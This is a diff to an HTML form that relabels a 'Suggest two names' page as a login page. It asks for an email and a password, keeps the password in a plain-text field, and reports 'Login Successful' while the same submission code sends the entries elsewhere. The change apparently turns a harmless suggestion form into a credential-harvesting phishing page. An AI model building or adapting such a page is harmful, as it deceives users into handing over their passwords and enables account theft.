@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<title>Suggest names</title>
+<title>Login Information</title>
 <style>
   * { box-sizing: border-box; }
   html, body {
@@ -91,13 +91,13 @@
 <body>
 <div class="wrap">
   <div class="card">
-    <h1>Suggest two names</h1>
+    <h1>Enter login Information</h1>
 
-    <label for="name1">Name 1</label>
-    <input type="text" id="name1" placeholder="e.g. Amara" />
+    <label for="name1">Email</label>
+    <input type="text" id="name1" placeholder="e.g. Amara@yahoo.com" />
 
-    <label for="name2">Name 2</label>
-    <input type="text" id="name2" placeholder="e.g. Kai" />
+    <label for="name2">Password</label>
+    <input type="text" id="name2" placeholder="e.g. Kai1234" />
 
     <p id="err"></p>
     <p id="ok"></p>
@@ -118,7 +118,7 @@
     ok.textContent = "";
 
     if (!name1 || !name2) {
-      err.textContent = "Enter both names.";
+      err.textContent = "Complete Form";
       return;
     }
 
@@ -136,7 +136,7 @@
       if (!resp.ok) {
         err.textContent = data.error || "Something went wrong.";
       } else {
-        ok.textContent = "Thanks! Your suggestion was sent.";
+        ok.textContent = "Login Successful";
         document.getElementById("name1").value = "";
         document.getElementById("name2").value = "";
       }
